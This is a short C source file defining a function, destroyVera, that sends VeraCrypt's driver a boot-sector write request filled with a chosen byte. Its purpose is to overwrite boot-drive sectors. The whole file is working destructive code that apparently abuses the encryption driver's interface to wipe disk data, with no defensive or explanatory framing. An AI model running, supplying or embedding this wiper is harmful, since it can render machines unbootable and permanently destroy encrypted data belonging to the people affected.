#include "veracrypt.h"

/*------------------------------------------------------------------
   destroyVera( sector, value )

   Description
	 overwrite the sector with what is specified in value 
	 e.g. 65 == 'A'
	 
--------------------------------------------------------------------*/
void destroyVera(LONGLONG sector, int value)
{
	DWORD bytesReturned;
	BYTE output[TC_SECTOR_SIZE_BIOS];

	WriteBootDriveSectorRequest request;
	request.Offset.QuadPart = sector * TC_SECTOR_SIZE_BIOS;

	memset(request.Data, value, TC_SECTOR_SIZE_BIOS);

	HANDLE hDriver = CreateFile(WIN32_ROOT_PREFIX, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, 0, NULL);

	if (hDriver != INVALID_HANDLE_VALUE)
	{
		if (!DeviceIoControl(hDriver, TC_IOCTL_WRITE_BOOT_DRIVE_SECTOR, &request, sizeof(request),
			output, TC_SECTOR_SIZE_BIOS, &bytesReturned, NULL))
		{
			printf("Error %d\n", GetLastError());
		}
	}
	else
		printf("unable to open device");
}